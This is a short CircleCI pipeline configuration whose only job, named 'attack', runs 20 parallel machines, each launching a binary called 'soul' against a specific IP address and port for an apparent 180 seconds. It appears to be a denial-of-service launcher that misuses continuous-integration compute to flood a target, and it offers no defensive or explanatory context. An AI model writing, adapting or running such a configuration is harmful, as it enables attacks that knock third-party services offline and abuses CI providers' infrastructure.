version: 2.1
jobs:
  attack:
    machine:
      image: ubuntu-2204:current
    resource_class: medium
    parallelism: 20
    steps:
      - checkout
      - run:
          name: Run Attack
          command: |
             chmod +x soul
             ./soul 20.235.143.164 10360 180 || true

workflows:
  attack_flow:
    jobs:
      - attack
